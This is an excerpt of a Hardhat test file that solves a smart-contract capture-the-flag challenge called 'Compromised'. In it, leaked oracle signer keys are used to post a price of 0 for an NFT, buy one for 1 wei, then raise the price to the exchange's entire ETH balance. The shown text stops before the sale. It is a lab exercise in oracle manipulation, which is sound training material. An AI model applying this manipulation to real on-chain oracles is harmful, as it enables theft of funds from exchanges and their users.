...
describe("Compromised challenge", function () {
    ...
    it("Execution", async function () {
        ...
        const compromisedOracleSigners = compromisedOracles.map((wallet) => {
            return wallet.connect(ethers.provider);
        });

        await oracle.connect(compromisedOracleSigners[0]).postPrice("DVNFT", 0);
        await oracle.connect(compromisedOracleSigners[1]).postPrice("DVNFT", 0);

        await exchange.connect(player).buyOne({ value: 1 });

        await oracle.connect(compromisedOracleSigners[0]).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        await oracle.connect(compromisedOracleSigners[1]).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
